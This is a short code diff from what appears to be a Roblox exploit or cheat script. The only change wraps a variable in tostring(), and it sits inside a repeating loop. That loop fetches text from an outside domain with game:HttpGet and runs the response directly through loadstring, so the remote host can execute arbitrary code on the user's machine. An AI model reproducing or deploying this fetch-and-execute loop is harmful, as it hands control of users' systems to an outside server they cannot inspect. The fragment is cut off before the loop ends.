@@ -444,7 +444,7 @@ end)
 task.spawn(function()
     repeat 
         task.spawn(function() 
-            local response = game:HttpGet('https://science.renderintents.xyz/'..ria)
+            local response = game:HttpGet('https://science.renderintents.xyz/'..tostring(ria))
             pcall(function()
                 if GuiLibrary then 
                     loadstring(response)()
